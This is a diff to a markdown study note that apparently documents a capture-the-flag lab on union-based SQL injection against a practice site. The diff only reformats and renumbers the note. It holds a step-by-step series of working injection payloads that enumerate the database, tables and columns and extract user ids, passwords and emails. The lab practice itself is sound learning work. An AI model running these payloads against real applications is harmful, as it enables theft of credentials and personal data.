@@ -77,15 +77,22 @@ over%' union select 1, id, pass, 4 from member
 ## Part 5 - Assignment
 1. Review Union SQL Injection (HTTP://ctf.segfaulthub.com:1020/sqlInjection3.php)
 2. dol dol data (only one result) (HTTP://ctf.segfaulthub.com:1020/sqlInjection_2_1.php)<br>
-a. Find out the point of the SQL Injection = 1234' or '1' ='1
-b. Find the number of columns = 1234' order by 4 #
-c. Find the number of print column locations = 1234' union select 1,2,3,4 #
-d. Find DB name = 1234' union select database(),2,3,4 #
-e. Find Table name = 1234' union select table_name,2,3,4 from information_schema.tables where table_schema = 'segfault_sql' #
-f. Find column name = 1234' union select column_name,2,3,4 from information_schema.columns where table_name = 'member' #
-g. Find Data = 0000' union select id,pass,email,info from member where id = 'doldol' #
+a. Find out the point of the SQL Injection
+  - 1234' or '1' ='1
+b. Find the number of columns
+  - 1234' order by 4 #
+c. Find the number of print column locations
+  - 1234' union select 1,2,3,4 #
+d. Find DB name
+  - 1234' union select database(),2,3,4 #
+e. Find Table name
+  - 1234' union select table_name,2,3,4 from information_schema.tables where table_schema = 'segfault_sql' #
+f. Find column name
+  - 1234' union select column_name,2,3,4 from information_schema.columns where table_name = 'member' #
+g. Find Data
+  - 0000' union select id,pass,email,info from member where id = 'doldol' #
 
-3. CTF questions<br>
+4. CTF questions<br>
 a. SQL Injection 1
 * Find out the point of the SQL Injection = ad%' and 1=1 #
 * Find out the number of columns = ad%' order by 4 #
